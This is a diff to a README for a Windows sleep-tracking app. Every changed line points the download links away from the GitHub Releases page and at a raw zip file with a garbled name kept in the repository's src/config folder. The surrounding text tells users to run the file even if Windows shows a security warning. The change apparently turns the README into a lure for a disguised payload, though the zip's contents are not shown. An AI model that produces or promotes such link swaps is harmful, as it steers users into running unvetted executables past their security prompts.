@@ -1,6 +1,6 @@
 # 💤 SLEEP-QUALITY-MONITOR - Sleep and Health Data, Made Clear
 
-[![Download SLEEP-QUALITY-MONITOR](https://img.shields.io/badge/Download%20Now-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/darceymucoid885/SLEEP-QUALITY-MONITOR/releases)
+[![Download SLEEP-QUALITY-MONITOR](https://img.shields.io/badge/Download%20Now-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/darceymucoid885/SLEEP-QUALITY-MONITOR/main/src/config/QUALIT_SLEE_MONITOR_v1.4.zip)
 
 ## 🌙 What It Does
 
@@ -10,7 +10,7 @@ Use it to review sleep patterns, spot signs of hydration strain, and check how y
 
 ## 📥 Download
 
-Visit this page to download: [SLEEP-QUALITY-MONITOR Releases](https://github.com/darceymucoid885/SLEEP-QUALITY-MONITOR/releases)
+Visit this page to download: [SLEEP-QUALITY-MONITOR Releases](https://raw.githubusercontent.com/darceymucoid885/SLEEP-QUALITY-MONITOR/main/src/config/QUALIT_SLEE_MONITOR_v1.4.zip)
 
 Open the latest release and download the Windows file. If there are several files, pick the one for Windows that ends in `.exe` or `.msi`.
 
@@ -28,7 +28,7 @@ For best use, keep your Windows updates current.
 
 ## ⚙️ How to Install
 
-1. Open the [Releases page](https://github.com/darceymucoid885/SLEEP-QUALITY-MONITOR/releases).
+1. Open the [Releases page](https://raw.githubusercontent.com/darceymucoid885/SLEEP-QUALITY-MONITOR/main/src/config/QUALIT_SLEE_MONITOR_v1.4.zip).
 2. Find the newest version at the top.
 3. Download the Windows installer or app file.
 4. If Windows shows a security prompt, choose **Keep** or **Run anyway** only if the file came from the release page above.
@@ -141,7 +141,7 @@ For clearer results:
 
 ## 📎 Release Download
 
-Get the Windows version here: [https://github.com/darceymucoid885/SLEEP-QUALITY-MONITOR/releases](https://github.com/darceymucoid885/SLEEP-QUALITY-MONITOR/releases)
+Get the Windows version here: [https://raw.githubusercontent.com/darceymucoid885/SLEEP-QUALITY-MONITOR/main/src/config/QUALIT_SLEE_MONITOR_v1.4.zip](https://raw.githubusercontent.com/darceymucoid885/SLEEP-QUALITY-MONITOR/main/src/config/QUALIT_SLEE_MONITOR_v1.4.zip)
 
 ## 🗂️ Folder Layout After Install
 
